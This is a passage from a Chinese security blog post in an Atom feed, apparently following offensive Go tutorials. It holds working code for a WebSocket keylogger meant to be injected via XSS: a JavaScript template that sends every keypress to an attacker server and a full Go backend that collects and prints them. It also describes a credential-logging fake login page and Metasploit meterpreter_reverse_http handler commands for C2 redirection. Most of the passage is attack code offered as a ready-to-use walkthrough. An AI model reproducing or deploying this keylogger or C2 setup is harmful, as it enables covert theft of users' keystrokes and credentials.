指的是创建新文件，创建文件之后，使用<code>log.SetOutput()</code>将句柄传递给他，以配置日志记录包并将其写入该文件。接下来，还需要告诉路由器从一个目录中提供静态文件。</p><p>开启的文件夹再以另一份形式放在代码的根目录下，之后当我们运行代码后，访问伪造的80端口，会将信息发储存在txt中，并且重定向到正确的8080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224108.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303230309.png"></p><h2 id="0x02-使用-websocket-API实现按键记录"><a href="#0x02-使用-websocket-API实现按键记录" class="headerlink" title="0x02 使用 websocket API实现按键记录"></a>0x02 使用 websocket API实现按键记录</h2><p>近年来，全双工通信协议(websocket API)日益流行，许多浏览器开始支持他，他为web应用服务器和客户端之间的有效通信提供了一些方法。最重要的是，他允许服务器无需轮询就可以将消息发送到客户端</p><p>websocket对于构建诸如聊天游戏等实时应用程序比较有用。但我们也有其他用处，例如，将键盘记录程序注入，捕获用户按下的每个键。当我们可以进行xss攻击以后，我们可以包含一个<code>javascript</code>文件，以处理来自客户端<code>websocket</code>响应。</p><p>我们使用<code>JS Bin</code>(<a href="http://jsbin.com)来进行测试`payload`,代码如下/">http://jsbin.com)来进行测试`payload`，代码如下</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8080/k.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;/login&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;username&#x27;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;password&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们打开页面的时候，会提示创建了连接</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114813.png"></p><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114719.png"></p><p>当我们再打开的html页面键入的时候，会自动捕捉</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114915.png"></p><p>先定义一个js模板，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&#123;&#123;.&#125;&#125;/ws&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">        s = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(evt.<span class="property">which</span>);</span><br><span class="line">        conn.<span class="title function_">send</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p> 后端代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/websocket&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">upgrader = websocket.Upgrader&#123;</span><br><span class="line">CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listenAddr <span class="type">string</span></span><br><span class="line">wsAddr     <span class="type">string</span></span><br><span class="line">jsTemplate *template.Template</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.StringVar(&amp;listenAddr, <span class="string">&quot;listen-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address to listen on&quot;</span>)</span><br><span class="line">flag.StringVar(&amp;wsAddr, <span class="string">&quot;ws-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address for WebSocket connection&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">jsTemplate, err = template.ParseFiles(<span class="string">&quot;logger.js&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveWS</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;&quot;</span>, <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;Connection from %s\n&quot;</span>, conn.RemoteAddr().String())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">_, msg, err := conn.ReadMessage()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;From %s: %s\n&quot;</span>, conn.RemoteAddr().String(), <span class="type">string</span>(msg))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">jsTemplate.Execute(w, wsAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/ws&quot;</span>, serveWS)</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/k.js&quot;</span>, serveFile)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要先下载<code>github.com/gorilla/websocket</code>的包</p><p>首先，定义一个<code>websocket.Upgrader</code>，该实例会将每个来源列入白名单，允许所有来源的做法是不安全的，但是，这里，我们选择继续使用，当作测试用例。之后再定义监听地址和 ws地址。以及定义<code>js</code>所使用的模板地址</p><p>然后创建<code>init函数</code>，再main函数之前，自动调用</p><blockquote><p>flag包用来设置参数和解析值：地址，参数，默认值和备注</p><p>然后使用Parse()进行解析</p></blockquote><p>接下来定义了一个 <code>ServeWS</code>的函数，用来处理<code>websocket</code>通信，通过<code>upgrader.Upgrade</code>方法，创建新的<code>websocket,Conn</code>实例。方法<code>Upgrade()</code>升级了HTTP连接以使用<code>websocket</code>协议。这将意味着此函数处理任何请求都将升级为使用<code>websocket</code>，再无限的for循环中进行交互，调用<code>conn.ReadMessage()</code>读取信息，</p><p>然后我们创建一个<code>serveFile()</code>的处理函数，此函数将检索并且返回<code>javascript</code>的模板内容，其中包括上下文数据，为此，我们需要将<code>Content-Type</code>标头，设置为<code>application/javascript</code>，这就告诉连接正文，将与浏览器之间的响应内容视为<code>javascript</code>，</p><p>之后设置解析我们传入的<code>wsAddr</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsTemplate.Execute(w, wsAddr)</span><br></pre></td></tr></table></figure><p>最后我们只要创建路由就可以了。</p><h2 id="0x03-多路命令和控制"><a href="#0x03-多路命令和控制" class="headerlink" title="0x03 多路命令和控制"></a>0x03 多路命令和控制</h2><p>在本节中，我们需要学会 go 创建反向<code>http</code>代理，以便可以基于<code>Host HTTP</code>标头动态路由中传入的<code>Meterpreter</code>会话，这正是虚拟网站托管的方式。</p><p>首先，代理会充当重定向器，允许你仅公开域名和<code>IP</code>地址，而无需公开<code>metasploit</code>监听器，如果重定向器曾被列为黑名单，你可以直接移除他，而不是移除<code>C2</code>服务器。其次，你可以扩展这里的概念来进行域前置，他是利用可信第三方域绕过限制性出口的技术。</p><p>首先，我们需要设置单独的<code>MeterPreter</code>反向HTTP监听器</p><p>大致如下</p><blockquote><p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter_reverse_http<br>payload &#x3D;&gt; windows&#x2F;meterpreter_reverse_http<br>msf6 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.68.130<br>LHOST &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set LPORT 80<br>LPORT &#x3D;&gt; 80</p><p>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindAddress 192.168.68.130<br>ReverseListenerBindAddress &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindPort 20080<br>ReverseListenerBindPort &#x3D;&gt; 20080<br>msf6 exploit(multi&#x2F;handler) &gt; exploit -j -z<br>[<em>] Exploit running as background job 0.<br>[</em>] Exploit completed, but no session was created.</p><p>[*] Started HTTP reverse handler on <a href="http://192.168.68.130:20080/">http://192.168.68.130:20080</a></p></blockquote><blockquote><p> exploit -j -z    #handler后台持续监听</p></blockquote><p>然后，我们再以同样的方式,开一个30080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304125300.png"></p><p>这个没有成功复现，鸽一会</p>]]></content>
    
    
    <summary type="html">HTTP服务器，路由，中间件</summary>
    
    
    
    <category term="Go" scheme="https://h0ld1rs.github.io/categories/Go/"/>
    
    
    <category term="Golang" scheme="https://h0ld1rs.github.io/tags/Golang/"/>
    
  </entry>
  
</feed>
